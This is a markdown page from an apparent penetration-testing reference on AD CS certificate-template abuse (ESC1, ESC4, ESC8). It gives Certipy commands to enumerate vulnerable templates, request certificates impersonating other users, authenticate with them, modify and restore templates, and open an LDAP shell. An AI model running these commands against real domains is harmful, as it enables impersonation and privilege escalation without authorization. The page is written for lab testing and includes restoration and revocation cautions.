# AD CS: template checks

[← Active Directory quick reference](../05-active-directory.md)

AD CS present: enumerate with the controlled account; record CA name/FQDN, template name, publication, effective enrollment/edit rights, identity/SID, and tool/DC versions.

```bash
certipy find -u <user>@<domain.tld> -p '<password>' -dc-ip <dc-ip> -vulnerable -stdout
```

## ESC1: all issuance and authentication prerequisites

Confirm enrollee-supplied subject/SAN, an authentication-capable EKU, effective enrollment rights, publication by the intended CA, and no blocking manager-approval or authorized-signature requirement. Verify the requested identity/SID against the target object and the actual certificate; a vulnerable flag alone does not prove usable authentication. [Certipy ESC1 guide](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation).

```bash
certipy req -u <user>@<domain.tld> -p '<password>' -dc-ip <dc-ip> \
  -target <CA-FQDN> -ca <CA-NAME> -template <TEMPLATE> \
  -upn <target-user>@<domain.tld> -sid <TARGET-USER-SID>
certipy auth -pfx <issued-certificate>.pfx -dc-ip <dc-ip> -no-hash -no-save
```

Check the issued certificate's identity, SID binding, request ID, private key availability, and authentication result. Patched DCs enforce strong certificate mapping; UPN-only recipes from older labs can fail. Schannel also has mapping/trust prerequisites. [Microsoft certificate-binding changes](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

## ESC4: template control with backup and restoration

First establish the exact template right and a route that remains able to restore it. For Certipy's current parser, save the original configuration before applying a lab change:

```bash
certipy template -u <user>@<domain.tld> -p '<password>' -dc-ip <dc-ip> \
  -template <TEMPLATE> -save-configuration template-before.json
# In an isolated lab, use the controlled operator SID rather than a broad default principal:
certipy template -u <user>@<domain.tld> -p '<password>' -dc-ip <dc-ip> \
  -template <TEMPLATE> -write-default-configuration <OPERATOR-SID> \
  -save-configuration template-prechange.json
```

Verify the backup and changed fields, publication, enrollment rights, and resulting ESC1 prerequisites. After a bounded certificate proof, restore the saved original configuration:

```bash
certipy template -u <user>@<domain.tld> -p '<password>' -dc-ip <dc-ip> \
  -template <TEMPLATE> -write-configuration template-before.json
```

Re-enumerate and compare relevant settings/DACL; do not overwrite concurrent legitimate edits. These flags are from the reviewed current source; older guides' `-save-old` forms are version-specific. [Certipy template parser](https://github.com/ly4k/Certipy/blob/master/certipy/commands/parsers/template.py).

## ESC8: live authentication and enrollment endpoint

Use [NTLM relay](ntlm-relay.md#ad-cs-relay-esc8-follow-through) for source/destination policy, EPA, template/identity selection, issuance proof, and cleanup. A captured NetNTLM response file is insufficient.

## PKINIT and Schannel failures

For `KDC_ERR_PADATA_TYPE_NOSUPP`, check DC PKINIT support and its certificate configuration. Schannel/LDAP is an alternative only where TLS, client-certificate trust, mapping, and target rights fit:

```bash
certipy auth -pfx <issued-certificate>.pfx -dc-ip <dc-ip> -ldap-shell
```

An LDAP shell has the mapped principal's object rights, not automatically domain-admin rights. Inspect help and verify the authenticated identity before mutations. Preserve request IDs and required evidence, remove generated files after use, and handle CA-side revocation if required: deleting a PFX does not revoke a certificate.

Sources/options reviewed on 2026-10-02; actual issuance, authentication, template restoration, and revocation require isolated-lab validation. Record `python3 -m pip show certipy-ad` and inspect each subcommand's installed help.
